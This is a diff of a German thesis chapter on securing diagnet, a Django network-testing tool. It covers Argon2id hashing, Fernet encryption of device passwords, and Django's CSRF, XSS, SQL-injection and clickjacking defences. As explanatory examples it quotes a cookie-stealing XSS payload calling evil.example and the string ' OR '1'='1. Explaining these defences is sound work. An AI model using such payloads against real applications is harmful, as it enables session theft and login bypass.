@@ -1,11 +1,9 @@
 #import "@preview/htl3r-da:2.0.0" as htl3r
 
 #htl3r.author("Karun Sandhu")
-== Datenmodellierung und Datensicherheit <data_security>
+== Datenmodellierung <data_modeling>
 
-Eine Webanwendung ist letztlich nur so zuverlässig wie das Datenbankschema, auf dem sie aufbaut. Für #htl3r.long[diagnet] bedeutete das, zwei unterschiedliche Anforderungen unter einen Hut zu bringen: Einerseits mussten die Datenstrukturen flexibel genug sein, um sehr unterschiedliche Netzwerktests mit ihren jeweiligen Parametern abzubilden. Andererseits durfte diese Flexibilität nicht auf Kosten der Datenintegrität gehen, da fehlerhafte Konfigurationen in einem Netzwerktestsystem direkt zu falschen Testergebnissen führen können.
-
-Eng damit verknüpft ist die Frage der Datensicherheit: Zugangsdaten für Netzwerkgeräte zählen zu den sensibelsten Informationen einer IT-Infrastruktur und müssen entsprechend geschützt werden. Dieses Kapitel beschreibt die Konzeption des Datenbankschemas und die Maßnahmen zum Schutz dieser Daten vor unbefugtem Zugriff. Da das Schema in seiner Gesamtheit zu komplex für eine einzelne Abbildung wäre, zeigen @erd_struktur und @erd_ausfuehrung jeweils eine vereinfachte Sicht, die auf die für das Verständnis wesentlichen Felder und Relationen reduziert wurde.
+Eine Webanwendung ist letztlich nur so zuverlässig wie das Datenbankschema, auf dem sie aufbaut. Für #htl3r.long[diagnet] bedeutete das, zwei unterschiedliche Anforderungen unter einen Hut zu bringen: Einerseits mussten die Datenstrukturen flexibel genug sein, um sehr unterschiedliche Netzwerktests mit ihren jeweiligen Parametern abzubilden. Andererseits durfte diese Flexibilität nicht auf Kosten der Datenintegrität gehen, da fehlerhafte Konfigurationen in einem Netzwerktestsystem direkt zu falschen Testergebnissen führen können. Da das Schema in seiner Gesamtheit zu komplex für eine einzelne Abbildung wäre, zeigen @erd_struktur und @erd_ausfuehrung jeweils eine vereinfachte Sicht, die auf die für das Verständnis wesentlichen Felder und Relationen reduziert wurde.
 
 #figure(
   image("../assets/erd_struktur.png", width: 100%),
@@ -171,3 +169,164 @@ Die `save()`-Implementierung ist dabei bewusst defensiv gestaltet: Statt alle vo
 Jede Änderung an einem Django-Modell, sei es das Hinzufügen eines Feldes, die Modifikation eines Constraints oder die Einführung einer neuen Relation, wird durch das Migrationssystem des #htl3r.long[framework] als eigenständige, versionierte Migrationsdatei im Verzeichnis `migrations/` abgelegt. Diese Dateien sind Python-Skripte, die die Zustandsveränderung des Datenbankschemas atomar und reproduzierbar beschreiben.
 
 Für den Produktionseinsatz von #htl3r.long[diagnet] hat dieses Vorgehen einen entscheidenden Vorteil: Das Datenbankschema kann von einem leeren Zustand aus durch den Befehl `python manage.py migrate` vollständig aufgebaut werden, ohne dass manuelle #htl3r.short[sql]-Skripte notwendig wären. Die Migrationsdateien selbst werden im Git-Repository versioniert und bieten damit eine nachvollziehbare Historie aller Schemaänderungen über die gesamte Projektlaufzeit.
+
+== Datensicherheit <data_security>
+
+Zugangsdaten für Netzwerkgeräte zählen zu den sensibelsten Informationen einer IT-Infrastruktur. Dieses Kapitel beschreibt die Maßnahmen, die in #htl3r.long[diagnet] ergriffen wurden, um diese Daten sowohl im gespeicherten Zustand als auch während der Benutzerinteraktion zu schützen.
+
+=== Passwortsicherheit: Argon2 <password_security>
+
+Für die Absicherung von Benutzerpasswörtern setzt #htl3r.long[diagnet] auf Argon2id als Password-Hashing-Algorithmus. Django unterstützt Argon2 als optionales Hasher-Backend über die externe Abhängigkeit `argon2-cffi` @django-docs. Da Django standardmäßig PBKDF2-SHA256 verwendet, wurde `PASSWORD_HASHERS` in `settings.py` explizit überschrieben, um Argon2id an die erste Stelle zu setzen:
+
+#htl3r.code(
+  caption: [Konfiguration von Argon2id als primärem Password-Hasher],
+  description: `diagnet/settings.py`,
+)[
+  ```python
+  PASSWORD_HASHERS = [
+      "django.contrib.auth.hashers.Argon2PasswordHasher",
+      "django.contrib.auth.hashers.PBKDF2PasswordHasher",
+  ]
+  ```
+]
+
+Der zweite Eintrag dient der Rückwärtskompatibilität: Existierende Passwörter, die noch mit PBKDF2 gehasht wurden, können weiterhin verifiziert werden. Beim nächsten erfolgreichen Login wird das Passwort automatisch mit Argon2id neu gehasht @django-docs.
+
+==== Funktionsprinzip von Argon2
+
+Argon2 ist eine *Key Derivation Function* und gewann 2015 den Password Hashing Competition, der explizit nach einem Nachfolger für ältere Verfahren wie bcrypt und PBKDF2 suchte @rfc9106. Der entscheidende Unterschied zu diesen Vorgängern liegt darin, dass Argon2 nicht nur rechenintensiv, sondern auch gezielt *speicherintensiv* ist. Die Speicheranforderung lässt sich über den Parameter `memory_cost` in Kilobyte konfigurieren und ist fester Bestandteil der Algorithmusdefinition, nicht nachträgliche Optimierung @rfc9106.
+
+Argon2 existiert in drei Varianten: Argon2d ist optimiert gegen GPU-Angriffe, Argon2i gegen Seitenkanalangriffe, und Argon2id kombiniert beide Ansätze @rfc9106. Djangos Implementierung verwendet standardmäßig Argon2id, was für allgemeine Passwort-Hashing-Zwecke die empfohlene Wahl ist @django-docs.
+
+Die drei zentralen Kostparameter sind `time_cost` (Anzahl der Iterationen), `memory_cost` (Speicherbedarf in KiB) und `parallelism` (Anzahl paralleler Threads) @rfc9106. Die konkreten Mindestwerte für diese Parameter orientieren sich an den Empfehlungen der #htl3r.short[owasp] @owasp-password-storage. Ein Angreifer, der GPU-Hardware einsetzt, profitiert bei Argon2id weit weniger als bei rein rechenintensiven Verfahren: Grafikprozessoren verfügen zwar über tausende von Rechenkernen, aber über vergleichsweise wenig schnellen On-Chip-Speicher. Die Speicheranforderung von Argon2id zwingt jeden parallelen Angriff, diesen knappen Speicher zu belegen, was die effektiv nutzbare Parallelität drastisch reduziert @rfc9106.
+
+==== Warum nicht PBKDF2?
+
+PBKDF2-SHA256 ist der Django-Standard und kryptografisch nicht gebrochen, aber rein rechenintensiv und lässt sich auf moderner GPU-Hardware effizient parallelisieren @owasp-password-storage. Ein Angreifer mit einer Consumer-GPU kann PBKDF2-Hashes in einer Größenordnung von hunderten Millionen Versuchen pro Sekunde testen, sofern er Zugriff auf die Datenbank erlangt hat. Die Speicherbindung von Argon2id macht diesen Vorteil zunichte @rfc9106. Da `argon2-cffi` eine einzelne, stabile Abhängigkeit ohne eigene Transitivabhängigkeiten ist, überwiegt der Sicherheitsgewinn.
+
+=== Verschlüsselung von Gerätepasswörtern: Fernet <device_encryption>
+
+Benutzerpasswörter werden gehasht, weil Django bei der Authentifizierung nur den Hash vergleicht und den Klartext nie benötigt. Bei Zugangsdaten für Netzwerkgeräte ist das anders: #htl3r.long[diagnet] muss `password` und `enable_password` im Klartext an pyATS übergeben, da Einwegfunktionen hier nicht verwendbar sind. Die Anforderung ist reversible *Verschlüsselung*.
+
+Für diesen Zweck kommt `cryptography.fernet` zum Einsatz, eine Python-Bibliothek, die auf dem Konzept der authentifizierten symmetrischen Verschlüsselung aufbaut @fernet-spec.
+
+==== Aufbau eines Fernet-Tokens
+
+Ein Fernet-Token ist kein roher Chiffretext, sondern ein strukturiertes, selbstbeschreibendes Format @fernet-spec. Jedes Token besteht aus den in @fernet_token_struktur aufgeführten Komponenten, die base64url-kodiert als einheitlicher String gespeichert werden:
+
+#figure(
+  table(
+    columns: (auto, 1fr, auto),
+    table.header([*Feld*], [*Inhalt*], [*Größe*]),
+    [`Version`], [Versionsbyte, fest auf `0x80`], [1 Byte],
+    [`Timestamp`],
+    [Zeitpunkt der Verschlüsselung (64-bit big-endian)],
+    [8 Byte],
+
+    [`IV`], [Zufälliger Initialisierungsvektor für AES-CBC], [16 Byte],
+    [`Ciphertext`], [Mit AES-128-CBC verschlüsselte Nutzlast], [variabel],
+    [`HMAC`], [SHA-256-MAC über alle vorherigen Felder], [32 Byte],
+  ),
+  caption: [Struktur eines Fernet-Tokens],
+) <fernet_token_struktur>
+
+Der Chiffretext wird mit *AES-128-CBC* erzeugt. Der 256-Bit-Fernet-Schlüssel wird dabei aufgeteilt: Die ersten 128 Bit dienen als Signaturschlüssel für den #htl3r.full[hmac], die zweiten 128 Bit als Verschlüsselungsschlüssel für AES @fernet-spec. Der Timestamp ist Teil des authentifizierten Bereichs, weshalb ein Angreifer das Ausstellungsdatum eines Tokens nicht nachträglich manipulieren kann, ohne den #htl3r.short[hmac] zu brechen.
+
+==== HMAC als Integritätssicherung
+
+Der #htl3r.short[hmac] am Ende des Tokens ist der entscheidende Unterschied zwischen reiner Verschlüsselung und *authentifizierter* Verschlüsselung @rfc2104. AES-CBC allein würde nur Vertraulichkeit bieten, aber keine Integrität: Ein Angreifer könnte Bits im Chiffretext verändern, und das System würde beim Entschlüsseln fehlerhafte Daten produzieren, ohne dies zu erkennen. Fernet löst dieses Problem durch #htl3r.short[hmac]-SHA256: Bevor entschlüsselt wird, verifiziert die Bibliothek den MAC kryptografisch gegen den gespeicherten Schlüssel @fernet-spec. Schlägt diese Verifikation fehl, wird eine `InvalidToken`-Exception geworfen; die Entschlüsselung beginnt gar nicht erst.
+
+In der `_decrypt_value`-Methode des `Device`-Modells wird genau dieses Verhalten genutzt:
+
+#htl3r.code(
+  caption: [Entschlüsselung mit Integritätsprüfung im Device-Modell],
+  description: `devices/models.py`,
+)[
+  ```python
+  def _decrypt_value(self, value: str) -> str:
+      if not value.startswith(self.ENCRYPTION_PREFIX):
+          raise ValidationError(
+              f"Decryption Error: Data corruption detected. "
+              f"Stored value is missing the required '{self.ENCRYPTION_PREFIX}' prefix."
+          )
+
+      actual_value = value[len(self.ENCRYPTION_PREFIX):]
+
+      if not self._is_fernet_token(actual_value):
+          raise ValidationError(
+              "Decryption Error: Data marked as encrypted "
+              "does not follow the expected format."
+          )
+
+      f = self._get_cipher_suite()
+      try:
+          return f.decrypt(actual_value.encode()).decode()
+      except (InvalidToken, ValueError):
+          raise ImproperlyConfigured(
+              "Security Error: Data marked as encrypted looks like a valid token "
+              "but cannot be decrypted with the current key. "
+              "Verify DEVICE_ENCRYPTION_KEY."
+          )
+  ```
+]
+
+Das Präfix `enc:` vor jedem gespeicherten Wert dient als explizites Marker-Byte auf Anwendungsebene. Damit lässt sich beim Laden eines Datensatzes eindeutig feststellen, ob ein Feld bereits verschlüsselt ist oder ob es sich um Klartextdaten aus einer Migration oder einem Fehler handelt. Die Methode `_is_fernet_token()` prüft zusätzlich das Versionsbyte `0x80` sowie die Mindestlänge des base64url-dekodierten Tokens, bevor überhaupt eine Entschlüsselung versucht wird. Damit wird verhindert, dass beliebige Zeichenketten zur Entschlüsselung eingereicht werden können.
+
+==== Schlüsselverwaltung und Key Rotation
+
+Der Fernet-Schlüssel (`DIAGNET_DEVICE_ENCRYPTION_KEY`) wird beim ersten Start der Anwendung automatisch generiert und in `secrets.env` innerhalb des konfigurierten Datenpfads persistiert. Dieser Schlüssel muss mit demselben Schutzniveau behandelt werden wie ein privater Zertifikatsschlüssel: Er darf nicht im Versionskontrollsystem landen und muss bei einem kompromittierenden Vorfall rotiert werden.
+
+Für diesen Fall implementiert #htl3r.long[diagnet] den Management-Befehl `rotate_encryption_key`. Dieser entschlüsselt alle gespeicherten Gerätepasswörter mit dem alten Schlüssel und verschlüsselt sie atomar in derselben Datenbanktransaktion mit dem neuen Schlüssel. Der Einsatz von `transaction.atomic()` stellt sicher, dass die Datenbank im Fehlerfall konsistent bleibt: Entweder sind alle Passwörter mit dem neuen Schlüssel verschlüsselt, oder kein einziges.
+
+#htl3r.code(
+  caption: [Atomare Schlüsselrotation via Django-Management-Befehl],
+  description: `devices/management/commands/rotate_encryption_key.py`,
+)[
+  ```python
+  with transaction.atomic():
+      for device in devices:
+          for field_name in ["password", "enable_password"]:
+              val = getattr(device, field_name)
+              actual_encrypted = val[len(Device.ENCRYPTION_PREFIX):]
+              plain = fernet_old.decrypt(actual_encrypted.encode()).decode()
+              new_enc = (
+                  f"{Device.ENCRYPTION_PREFIX}"
+                  f"{fernet_new.encrypt(plain.encode()).decode()}"
+              )
+              setattr(device, field_name, new_enc)
+          Device.objects.filter(pk=device.pk).update(
+              password=device.password,
+              enable_password=device.enable_password,
+          )
+  ```
+]
+
+=== Web-Sicherheit: Djangos eingebaute Schutzmechanismen <web_security>
+
+Neben der Absicherung gespeicherter Daten muss eine Webanwendung auch gegen aktive Angriffe auf die Benutzerinteraktion gewappnet sein. Django adressiert die gängigsten Angriffsvektoren durch Mechanismen, die standardmäßig aktiv sind und in `settings.py` über die `MIDDLEWARE`-Liste eingebunden werden @django-security. Für #htl3r.long[diagnet] relevant sind vor allem drei davon.
+
+==== Cross-Site Request Forgery
+
+Bei einem #htl3r.full[csrf]-Angriff bringt eine fremde Website einen bereits authentifizierten Benutzer dazu, ungewollt eine Anfrage an die Zielanwendung zu stellen, etwa durch ein verstecktes Formular, das beim Laden der Seite automatisch abgeschickt wird @owasp-top10. Da der Browser die Session-Cookies automatisch mitschickt, kann der Server die Anfrage nicht anhand der Cookies von einer legitimen unterscheiden.
+
+Django begegnet diesem Angriff mit dem `CsrfViewMiddleware`-Token-Verfahren @django-security. Bei jeder serverseitig gerenderten Seite wird ein kryptografisch zufälliger Token in ein verstecktes Formularfeld (`{% csrf_token %}`) eingebettet. Dieser Token ist an die Session des Benutzers gebunden. Eingehende POST-, PUT- und DELETE-Anfragen werden abgelehnt, wenn der Token fehlt oder nicht mit dem session-gebundenen Wert übereinstimmt. Eine externe Website kann diesen Token nicht auslesen, da die Same-Origin-Policy des Browsers den JavaScript-Zugriff auf Inhalte fremder Domains unterbindet.
+
+In den Templates von #htl3r.long[diagnet] ist `{% csrf_token %}` in jedem Formular eingebunden, beginnend beim Login-Formular bis hin zu allen zustandsverändernden Operationen wie dem Anlegen oder Löschen von Geräten.
+
+==== Cross-Site Scripting
+
+#htl3r.full[xss]-Angriffe zielen darauf ab, schadhaften JavaScript-Code in die Ausgabe einer Webanwendung einzuschleusen, der dann im Browser anderer Benutzer ausgeführt wird @owasp-top10. Im einfachsten Fall könnte ein Angreifer einen Hostnamen wie `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` in das Namensfeld eines Geräts eintragen. Würde dieser Wert ungefiltert in eine HTML-Seite eingebettet, könnten die Session-Cookies aller Benutzer, die diese Seite aufrufen, an einen Angreifer übermittelt werden.
+
+Django verhindert dies durch automatisches HTML-Escaping in seiner Template-Engine @django-security. Jede Variable, die mit `{{ variable }}` ausgegeben wird, wird standardmäßig escaped: `<` wird zu `&lt;`, `>` zu `&gt;` und `"` zu `&quot;`. Der oben genannte Angriffsversuch würde damit als harmloser Klartext im Browser angezeigt, nicht als ausführbarer Code. In #htl3r.long[diagnet] kommt der `safe`-Filter, der das Escaping explizit deaktiviert, in keinem Template vor.
+
+==== SQL-Injection
+
+Bei einer SQL-Injection-Attacke werden benutzerkontrollierte Eingaben ungefiltert in SQL-Abfragen eingebettet, was einem Angreifer ermöglicht, die Abfragelogik zu verändern @owasp-top10. Der klassische Angriff `' OR '1'='1` in einem Login-Formular würde eine naiv implementierte Authentifizierungsabfrage aushebeln und Zugriff ohne gültige Credentials gewähren.
+
+Da #htl3r.long[diagnet] ausschließlich Djangos #htl3r.short[orm] für Datenbankoperationen einsetzt und an keiner Stelle rohe SQL-Strings mit Benutzerinhalten konkateniert werden, ist dieser Angriffsvektor ausgeschlossen. Das #htl3r.short[orm] verwendet intern *Prepared Statements* mit parametrisierten Queries @django-security, bei denen die Datenbank Abfragestruktur und Benutzerdaten als vollständig getrennte Elemente erhält. Die Datenbank-Engine interpretiert Benutzereingaben damit nicht als SQL-Code, unabhängig von deren Inhalt.
+
+==== Clickjacking und HTTP-Sicherheitsheader
+
+Djangos `XFrameOptionsMiddleware` setzt den HTTP-Response-Header `X-Frame-Options: DENY`, der dem Browser mitteilt, dass die Anwendung nicht in einem `<iframe>` eingebettet werden darf @django-security. Dieser Schutz verhindert sogenannte Clickjacking-Angriffe, bei denen eine legitime Seite unsichtbar über einer manipulierten Seite überlagert wird, um Benutzerklicks abzufangen @owasp-top10. Da #htl3r.long[diagnet] keine einbettbaren Inhalte anbietet, ist diese Einschränkung ohne funktionalen Nachteil.
+
+Die `SecurityMiddleware` setzt bei korrekt konfiguriertem TLS zusätzlich den `Strict-Transport-Security`-Header, der den Browser anweist, ausschließlich HTTPS-Verbindungen zu dieser Domain zuzulassen. Da #htl3r.long[diagnet] in Produktivumgebungen hinter einem Reverse Proxy mit TLS-Terminierung betrieben wird, greift dieser Mechanismus dort vollständig.
